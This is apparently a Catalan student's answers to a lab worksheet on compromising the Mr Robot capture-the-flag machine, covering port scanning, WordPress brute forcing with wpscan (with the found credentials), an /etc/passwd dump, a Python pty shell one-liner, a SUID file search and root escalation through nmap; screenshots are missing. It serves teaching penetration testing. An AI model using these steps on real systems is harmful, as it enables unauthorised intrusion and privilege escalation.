Workshop 4

1. Quins ports té oberts la víctima?

PORT    STATE  SERVICE
80/tcp  open   http
443/tcp open   https

2. Quina sèrie televisiva està representada a la web?

MrRobot

3. Cerca possibles noms de carpetes i fitxers del servidor web amb la comanda nmap i l’script http-enum, i digues a quina URL podem fer un login.

He trobat aquestes dues:

/wp-login.php: Wordpress login page.







4. Amb quin programari està creat el contingut web on podem fer login?

Amb Wordpress:
























5. Per fer un atac de força bruta, quins usuaris provaries tenint en compte el tema de la web?

El nom de l’usuari per defecte és admin, llavors provaria admin, però també es podria provar administrator, administrador, root, etc. 

Si parlem de la sèrie robot, mrobot o elliot.












6. Fes un atac de força bruta amb l’eina wpscan, els usuaris que acabes d’anomenar i un diccionari de contrasenyes. Quin és l’usuari i la contrasenya correcta?

L’usuari és elliot i la contrasenya és qosqomanta




7. Quin usuari ets?









8. Quins usuaris hi ha al sistema?






















root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
mysql:x:1001:1001::/home/mysql:
varnish:x:999:999::/home/varnish:
robot:x:1002:1002::/home/robot:
montilivi:x:0:0::/home/montilivi:
ossec:x:104:108::/var/ossec:/bin/false

9. Quins fitxers hi ha al home de l’usuari robot?









10. Quina és la contrasenya de l’usuari robot?

python -c 'import pty; pty.spawn("/bin/bash")'

He trobat la password:
abcdefghijklmnopqrstuvwxyz







11. Qins fitxers hi ha?


robot@linux:~$ find /* -user root -perm -4000 -print 2> /dev/null
find /* -user root -perm -4000 -print 2> /dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown


12. Quina comanda escriuries a l’nmap per obtenir la shell amb permisos root? Mostra una captura de pantalla amb el resultat.

Tenim aquesta versió de nmap:



I amb el que se’ns indica anem a https://gtfobins.github.io/gtfobins/nmap/ 

I el que haurem de fer per obtenir el shell amb permisos root és això:



I ara ho fem:



I amb aquestes comandes ja tenim els permisos root.
